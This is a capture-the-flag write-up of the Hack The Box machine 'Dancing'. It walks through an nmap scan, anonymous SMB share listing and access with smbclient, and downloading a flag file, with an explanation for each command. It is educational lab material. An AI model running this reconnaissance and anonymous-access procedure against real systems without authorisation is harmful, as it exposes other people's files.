# HTB Starting Point - Dancing

## Overview

Dancing is a very easy Windows machine that focuses on SMB (Server Message Block) enumeration and identifying accessible network shares.

The goal is to discover an SMB share that allows anonymous access, enumerate its contents, and retrieve the flag.

---

## Skills Practised

- Enumeration
- Service Discovery
- SMB
- Share Enumeration
- Anonymous Authentication
- File Retrieval

---

## Environment

All commands in this writeup were performed using the Hack The Box AttackBox PowerShell environment.

---

## Enumeration

The first thing I did was run an Nmap scan against the target machine to identify any exposed services.

### Command

```powershell
nmap -sV <TARGET_IP>
```

### What it does

- `nmap` scans a target for open ports and services.
- `-sV` attempts to identify the services running on open ports.

### Why I used it

Before attempting any exploitation, I wanted to identify the attack surface and determine what services were available.

### Result

```text
445/tcp open microsoft-ds
```

The scan revealed SMB running on port 445, which became the focus of further enumeration.

---

## SMB Share Enumeration

After identifying SMB, I wanted to see what shares were available on the target.

### Command

```powershell
smbclient -L //<TARGET_IP>/ -N
```

### What it does

- `smbclient` is used to interact with SMB shares.
- `-L` lists available shares.
- `-N` attempts authentication without prompting for a password.

### Why I used it

I wanted to determine whether any SMB shares could be accessed anonymously.

### Result

```text
ADMIN$
C$
IPC$
WorkShares
```

The share that stood out was `WorkShares` because it was not one of the default Windows administrative shares.

---

## Exploitation

Since the WorkShares share appeared accessible, I attempted to connect to it.

### Command

```powershell
smbclient //<TARGET_IP>/WorkShares -N
```

### What it does

Connects directly to the WorkShares SMB share using anonymous authentication.

### Why I used it

I wanted to inspect the contents of the share and determine whether any files were exposed.

### Result

I successfully connected to the share.

---

## Flag Retrieval

After connecting to the share, I began enumerating its contents.

### Command

```text
ls
```

### What it does

Lists files and folders in the current share.

### Why I used it

To identify any directories or files available for access.

### Result

```text
Amy.J
James.P
```

Two user directories were visible.

---

### Command

```text
cd James.P
```

### What it does

Changes into the `James.P` directory.

### Why I used it

I wanted to inspect each available directory and look for sensitive files.

### Result

Successfully entered the directory.

---

### Command

```text
ls
```

### What it does

Lists files in the current directory.

### Why I used it

To determine what files were available for download.

### Result

```text
flag.txt
```

A file named `flag.txt` was present.

---

### Command

```text
get flag.txt
```

### What it does

Downloads a file from the SMB share to the local machine.

### Why I used it

The flag file was stored remotely and needed to be retrieved before viewing it.

### Result

The file was downloaded successfully.

---

### Command

```text
exit
```

### What it does

Closes the SMB session.

### Why I used it

The required file had already been downloaded.

---

### Command

```powershell
cat flag.txt
```

### What it does

Displays the contents of a text file.

### Why I used it

To read the contents of the downloaded file.

### Result

The flag was displayed and submitted successfully.

---

## Commands Used

```powershell
nmap -sV <TARGET_IP>

smbclient -L //<TARGET_IP>/ -N

smbclient //<TARGET_IP>/WorkShares -N

ls

cd James.P

ls

get flag.txt

exit

cat flag.txt
```

---

## What I Learned

- How to identify SMB services using Nmap.
- How to enumerate SMB shares with `smbclient`.
- How anonymous access can expose sensitive files.
- How to navigate SMB shares and download files.
- The importance of properly securing file-sharing services.

---

## Challenges

This machine was my first introduction to SMB enumeration. It helped me understand that finding a service is only the beginning of the process and that accessible shares, folders, and files all need to be investigated individually.

---

## Key Takeaway

Dancing demonstrated how a simple SMB misconfiguration can expose sensitive information. No exploit was required. By identifying an accessible share and enumerating its contents, I was able to retrieve the flag. This reinforced the importance of securing file-sharing services and restricting anonymous access wherever possible.